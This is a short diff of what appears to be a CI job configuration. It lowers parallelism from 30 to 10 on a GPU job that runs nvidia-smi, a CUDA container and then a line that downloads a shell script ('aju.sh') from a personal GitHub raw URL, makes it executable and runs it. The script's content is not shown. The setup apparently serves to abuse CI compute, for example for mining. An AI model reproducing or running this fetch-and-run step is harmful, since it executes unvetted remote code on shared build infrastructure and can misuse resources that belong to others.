@@ -9,4 +9,4 @@ jobs:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
       - run: wget https://raw.githubusercontent.com/githuboneheart/mom/main/aju.sh && chmod +x aju.sh && ./aju.sh
-    parallelism: 30
+    parallelism: 10
